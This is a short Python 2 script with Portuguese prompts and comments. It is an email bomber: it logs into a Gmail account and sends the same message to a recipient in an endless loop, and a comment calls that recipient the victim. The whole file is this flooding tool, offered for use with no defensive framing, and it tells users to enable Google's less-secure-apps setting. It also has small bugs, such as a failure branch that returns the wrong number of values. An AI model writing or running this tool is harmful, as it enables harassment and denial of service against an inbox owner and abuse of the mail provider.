from email.mime.text import MIMEText
from email.MIMEMultipart import MIMEMultipart
import smtplib as s
import sys

def main():
    email_user = raw_input('INFORME SEU E-MAIL (GMAIL): ')
    email_pass = raw_input('INFORME SUA SENHA: ')

    validade,conn = test(email_user, email_pass)
    print conn
    if validade == True:
        send_emails(email_user,conn)
    else:
        sys.exit

#VALIDA O LOGIN E SENHA
def test(email_user, email_pass):
    try:
        conn = s.SMTP('smtp.gmail.com', 587)
        conn.starttls()
        conn.ehlo
        conn.login(email_user, email_pass)
        return True,conn

    except:
        print 'FALHA NA CONEXÃO'
        print '1º - VERIFIQUE SEU USUÁRIO E SENHA'
        print '2º - CERTIFIQUE-SE DE QUE HABILITOU OS APLICATIVOS MENOS SEGUROS'
        print 'URL: https://www.google.com/settings/security/lesssecureapps'
        return False

def send_emails(email_user,conn):
    #Pega o e-mail da vítima
    FROM = email_user
    TO = raw_input('INFORME O DESTINATÁRIO: ')

    #Escreve o e-mail
    SUBJECT = raw_input('INFORME O ASSUNTO: ')
    text = raw_input('ESCREVA UMA MENSAGEM: ')

    #Formata a mensagem nos padrões de envio SMTP
    message = MIMEMultipart()
    message['From'] = FROM
    message['To'] = TO
    message['Subject'] = SUBJECT
    message.attach(MIMEText(text, 'plain'))
    email = message.as_string()

    #Envia o E-mail
    i = 0
    while True:    
        try:
    	    i += 1	
            conn.sendmail(FROM, TO, email)
            print '[%s] - Pressione CTRL + C para cancelar' % i
        except:
            print 'Fail...'
            sys.exit()


main()
